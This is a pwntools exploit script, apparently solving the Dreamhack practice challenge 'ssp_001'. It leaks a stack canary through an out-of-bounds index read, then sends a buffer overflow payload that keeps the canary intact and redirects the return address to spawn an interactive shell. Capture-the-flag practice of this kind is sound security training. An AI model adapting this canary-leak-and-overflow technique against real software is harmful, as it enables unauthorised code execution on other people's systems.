from pwn import *

context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
#p = process('./ssp_001')
#gdb.attach(p)
p = remote("host3.dreamhack.games",16597)
menu = "[F]ill the box\n[P]rint the box\n[E]xit\n>"

p.sendafter(menu,"F")
p.recvuntil("box input :")
p.send("aaaa")
canary=b"0x"

for i in range(131,128,-1):
    print(i)
    p.sendafter(menu,"P")
    p.recvuntil("Element index :")
    p.sendline(str(i))
    p.recvuntil("Element of index " + str(i) + " is : ")
    c = p.recv(2)
    print(c)
    canary += c
canary += b'00'
print(canary)
canary = int(canary,16)



p.sendafter(menu,"E")
payload = b''
payload += b'a'*64
payload += p32(canary)
payload += b'b'*8
payload += p32(0x080486b9)
print(payload)
p.recvuntil("Name Size :")
p.sendline(str(80))
p.sendafter("Name :",payload)

p.interactive()

